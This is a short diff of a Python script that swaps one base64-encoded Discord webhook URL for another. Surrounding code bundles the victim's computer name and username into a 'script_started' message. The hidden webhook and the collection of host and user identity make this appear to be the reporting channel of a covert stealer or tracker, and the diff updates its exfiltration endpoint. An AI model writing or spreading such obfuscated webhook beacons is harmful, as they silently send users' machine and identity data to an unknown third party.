@@ -8,7 +8,7 @@ import urllib.request
 from time import sleep
 
 # Base64-encoded Discord webhook URL
-WEBHOOK_B64 = "aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTQ2MTM2NTkwMjUzOTg4NjYxNC96SDZnWkI4YXNzLTY3TTJVQkVXWFcwTGk2a21vOWtPc2NrOUhOZ0pBMk5Ea2JhYW1vbWs0cDQ4bzR1WGdwaUZFdjJwZA=="
+WEBHOOK_B64 = "aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTQ2MjM5OTU2OTAzMDU0NTQyOS8xMHVfTGlGVFZfMC02c0JhSGYta1BTS0VqeDFSMlVkUVFWMDVtejJlOUpOSlA0QWVjOE9ZeUw2Y2FaallVYnh4U2N3Qg=="
 
 def format_start_data(computer_name,user_name):
     data = {'info':'script_started','script':'user','computer':computer_name,'username':user_name}
